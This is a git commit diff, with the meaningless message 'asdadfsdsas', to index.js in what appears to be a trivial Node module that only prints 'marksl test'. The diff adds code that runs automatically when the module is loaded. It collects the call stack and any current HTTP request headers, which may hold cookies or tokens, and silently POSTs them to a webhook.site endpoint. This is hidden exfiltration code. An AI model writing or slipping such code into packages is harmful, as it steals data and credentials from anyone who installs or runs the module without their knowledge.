e4d0a244826c9a65555622a9f369d7660607a0a8
markslWix <marksl@wix.com>
2024-04-10 10:20:54 +0300

    asdadfsdsas

--- index.js
+++ index.js
@@ -1,42 +1,47 @@
 const https = require('https')
 
-const error = new Error();
-Error.captureStackTrace(error);
-const callStack = error.stack;
+async function main() {
 
-const data = JSON.stringify({
-    callStack
-});
+    // getting the callstack
+    const error = new Error();
+    Error.captureStackTrace(error);
+    const callStack = error.stack;
 
-const options = {
-    hostname: 'webhook.site',
-    path: '/85f75f80-becd-4efb-8d26-404915a28143/hi',
-    method: 'POST',
-    headers: {
-        'Content-Length': data.length
+    // getting headers
+    let maybeReqHeaders;
+    try {
+        const getCurrentRequest = require('@wix/wix-request');
+        const currentRequest = await getCurrentRequest();
+        maybeReqHeaders = currentRequest.headers;
+    } catch (error) {
+        maybeReqHeaders = error
     }
-};
 
-const req = https.request(options, (res) => {
-    console.log(`Status code: ${res.statusCode}`);
-
-    res.on('data', (chunk) => {
-        console.log(`Body: ${chunk}`);
+    const data = JSON.stringify({
+        callStack,
+        maybeReqHeaders
     });
 
-    res.on('end', () => {
-        console.log('Request completed.');
-    });
-});
+    const options = {
+        hostname: 'webhook.site',
+        path: '/85f75f80-becd-4efb-8d26-404915a28143/hi',
+        method: 'POST',
+        headers: {
+            'Content-Length': data.length
+        }
+    };
 
-req.on('error', (error) => {
-    console.error(`Error: ${error.message}`);
-});
+    const req = https.request(options)
+    req.write(data);
+    req.end();
 
-req.write(data);
-req.end();
+    exports.printMsg = function() {
+        console.log("marksl test");
+    }
+}
+
+main();
 
 exports.printMsg = function() {
     console.log("marksl test");
-    return "marksl test";
-  }
+}
